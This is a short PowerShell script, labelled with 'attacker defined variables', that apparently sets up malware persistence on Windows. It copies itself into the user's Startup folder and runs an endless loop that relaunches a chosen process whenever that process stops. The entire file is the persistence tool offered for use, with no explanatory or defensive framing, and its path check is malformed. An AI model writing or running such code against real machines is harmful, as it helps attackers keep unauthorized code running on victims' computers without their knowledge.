#attacker defined variables
$pathofscript = "relative path of the script"
$persist = "process to persist"


#change directory to the one containing powersistnace
cd $pathofscript


#find startup folder
$path = [Environment]::GetFolderPath("Startup")

#check if the startup folder contains powersistance
$pathtest = Test-Path $path+"\powersistance.ps1" -ErrorAction SilentlyContinue

#perofm persistance
while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
if($pathtest -eq $false){
copy powersistance.ps1 $path -ErrorAction SilentlyContinue} 
if ($open -eq $null){start $persist}  
} 
